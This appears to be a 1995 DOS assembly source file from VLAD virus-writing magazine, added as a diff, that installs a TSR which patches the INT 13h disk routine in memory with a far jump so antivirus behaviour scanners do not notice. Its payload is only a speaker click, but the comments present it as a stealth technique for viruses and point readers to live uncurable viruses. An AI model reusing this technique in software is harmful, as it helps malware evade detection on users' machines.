@@ -1,0 +1,256 @@
+;
+;
+; INTERRUPT PATCH - Stealth stucture for your TSR             by SiRiUS
+; =====================================================================
+;                                                       Germany (c)1995
+;
+;  Interrupt Patch shows you an advanced technique on how to gain control
+;  of vital system functions like the interrupts.
+;
+;  The most used and known technique is to -hook- an interrupt by changing
+;  its interrupt vector in the interrupt vector table (IVT).
+;  This is very easy and needs no further explanation. Since most of the
+;  advanced behaviour-scanners (AV-TSR-Scanner) will notice such an obvious
+;  change in  the system  configuration, they  will recognise  it as a
+;  suspicious action, and probably alarm the user. Some of these programs
+;  will also offer the option to restore the  changed  vector so that any
+;  virus which was installed beforehand, will become deactivated.
+;
+;  Interrupt Patch is a prototype of another approach.  It will *patch*
+;  the original interrupt routine and insert a "JMP FAR MySeg:MyOfs" to
+;  its own code. Of course, no interrupt change will be necessary.
+;
+;  The code below is not a virus, it is a demonstration of the technique
+;  described above.  It makes the speaker click  everytime interrupt 13h
+;  is invoked.  You may  use this code freely in your own TSRs !
+;  Compile as usual with TASM or MASM.
+;
+;  If you are interested in seeing a live virus managing this technique
+;  look at some of the viruses by German author, Neurobasher, such as
+;  Neuroquila or N8fall. Be careful when experimenting, there is no cure
+;  program for these polymorphic and multipartite viruses at the moment!
+;
+;  You may contact me in an emergency via my friend at
+;  an244867@anon.penet.fi
+;
+;  --
+;
+;  Thanks and Hellos to: Tron, rEx, Ferrom, Metal Junkie, Sauron and
+;  all VX/AV-groups in their fight against primitive and boring self-
+;  replicating-code... ;)
+;
+;
+;=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/
+
+Frequency      EQU 2600
+
+CODE  Segment
+
+        ASSUME CS:CODE
+        ASSUME DS:CODE
+        ASSUME ES:CODE
+        ASSUME SS:CODE
+        ORG    100h
+
+Start:
+
+        JMP  Install
+
+;---- New Stack -------------------------------------------------------------
+
+Stapel  DW      0400h DUP (0)           ;64 Byte Stack
+
+StackEnd        LABEL   Word
+
+;---- Data ------------------------------------------------------------------
+
+        @AX             DW 0000h        ;Registers of the interrupted prog
+        @SS             DW 0000h
+        @SP             DW 0000h
+
+        @IP_broken      DW 0000h        ;From the intrpted prog
+        @CS_broken      DW 0000h
+        @Flg_broken     DW 0000h
+
+        Far_JMP         DB 11101010b    ;Opcode: "FAR JMP"
+        @New_Off        DW OFFSET New_13_Start
+        Patch_CS        DW 0000h        ;Its our CS
+        @New_Flg        DW 0000h        ;This will be PUSHed
+
+
+Org_INT_13:
+        Org_13_Off      DW 0000h        ;Original INT 13h
+        Org_13_Seg      DW 0000h
+
+        Org_13_1        DB   00h        ;INT 13 routine's first 5 bytes
+        Org_13_2        DW 0000h
+        Org_13_3        DW 0000h
+
+
+New_13_Start:
+        MOV  CS:@AX,AX
+        POP  AX
+        MOV  CS:@IP_broken ,AX
+        POP  AX
+        MOV  CS:@CS_broken ,AX
+        POP  AX
+        MOV  CS:@Flg_broken,AX
+
+        MOV  CS:@SP,SP
+        MOV  CS:@SS,SS
+
+        MOV  SP,Offset StackEnd
+        MOV  SS,CS:Patch_CS             ;Install new stack
+
+        PUSHF
+
+        AND  AX,0000001100000000b       ;Clear FLAGS (not IF and TF)
+        MOV  CS:@Flg_broken,AX
+
+        PUSH BX
+        PUSH CX
+        PUSH DX
+        PUSH BP
+        PUSH SI
+        PUSH DI
+        PUSH DS
+        PUSH ES
+
+        CALL    Make_Sound              ;Make a click :-) !
+
+        MOV  ES   ,CS:Org_13_Seg
+        MOV  BX   ,CS:Org_13_Off
+        MOV  AH   ,CS:Org_13_1
+        MOV  ES:BX,AH
+        MOV  AX   ,CS:Org_13_2
+        MOV  ES:BX+1,AX
+        MOV  AX   ,CS:Org_13_3
+        MOV  ES:BX+3,AX                 ;Restore old INT_13 routine
+
+        POP  ES
+        POP  DS
+        POP  DI
+        POP  SI
+        POP  BP
+        POP  DX
+        POP  CX
+        POP  BX                       
+
+        MOV  AX,CS:@AX
+        POPF
+        MOV  SS,CS:@SS
+        MOV  SP,CS:@SP
+
+        PUSHF
+        CALL DWORD PTR CS:[Org_INT_13]  ;Call old INT 13 routine
+
+; Back from int to here...
+
+        MOV  SP,Offset StackEnd
+        MOV  SS,CS:Patch_CS             ;Build new stack
+
+        PUSH ES
+        PUSH BX
+        PUSH CX
+
+        MOV  ES,CS:Org_13_Seg
+        MOV  BX,CS:Org_13_Off
+        MOV  BYTE PTR CH,CS:FAR_JMP
+        MOV  BYTE PTR ES:BX,CH
+        MOV  WORD PTR CX,CS:@New_Off
+        MOV  WORD PTR ES:BX+1,CX
+        MOV  WORD PTR CX,CS:Patch_CS
+        MOV  WORD PTR ES:BX+3,CX        ;Re-patch old INT 13 routine
+
+        PUSHF
+        POP  CX
+        OR   CS:@Flg_broken,CX
+
+        POP  CX
+        POP  BX
+        POP  ES
+        MOV  SS,CS:@SS
+        MOV  SP,CS:@SP                ;Restore
+
+        PUSH CS:@Flg_broken
+        PUSH CS:@CS_broken
+        PUSH CS:@IP_broken            ;Push old values
+
+        IRET                          ;Go back to the interrupted programm
+
+Make_Sound PROC NEAR
+        MOV  AL  ,0B6h
+        OUT  043h,AL
+        IN   AL  ,61h
+        OR   AL  ,03h
+        OUT  061h,AL
+        MOV  AX  ,Frequency
+        OUT  042h,AL
+        MOV  AL  ,AH
+        OUT  042h,AL                  
+        MOV  CX  ,00FFh
+Loopy:  LOOP Loopy
+        IN   AL,061h
+        AND  AL,0FCh
+        OUT  061h,AL
+        RET
+Make_Sound ENDP
+
+New_13_End:
+
+;=========================================================================
+; This installs us in memory
+;=========================================================================
+
+Install:
+        CLI
+
+        PUSH CS
+        POP  AX
+        MOV  Patch_CS,AX                ;Our SEGMENT
+
+        MOV  AX,3513h
+        INT  21h                        ;Get INT 13h into ES:BX
+
+        MOV  Org_13_Seg,ES
+        MOV  Org_13_Off,BX              ;Save INT-13h
+
+        MOV  AH,ES:BX
+        MOV  Org_13_1,AH
+        MOV  AX,ES:BX+1
+        MOV  Org_13_2,AX
+        MOV  AX,ES:BX+3                 ;Save first 5 Bytes of the INT -
+        MOV  Org_13_3,AX                ;Routine
+
+        MOV  BYTE PTR CH,FAR_JMP
+        MOV  BYTE PTR ES:BX,CH
+        MOV  WORD PTR CX,@New_Off
+        MOV  WORD PTR ES:BX+1,CX
+        MOV  WORD PTR CX,Patch_CS
+        MOV  WORD PTR ES:BX+3,CX        ;Patch the INT 13 Routine 
+
+        MOV  AH,09h
+        MOV  DX,Offset Message
+        INT  21h                        ;Show install-message
+
+        MOV  AX, OFFSET New_13_End
+        MOV  CL, 4
+        ADD  AX, 0Fh
+        SHR  AX, CL
+        MOV  DX, AX
+        STI
+        MOV  AX, 3100h
+        INT  21h                        ;Install as a TSR in memory
+
+
+Message DB   10d,13d
+        DB   '· INTERRUPT PATCH by SiRiUS/Germany for VLAD Magazine',10d,13d
+        DB   '--------------------------------------------------95-',10d,13d
+        DB   ' Presentation of the -slicing- interrupt technique.  ',10d,13d
+        DB   13d,10d
+        DB   13d,10d
+        DB   13d,10d,'$'
+
+Code    ENDS
+        END     Start
+
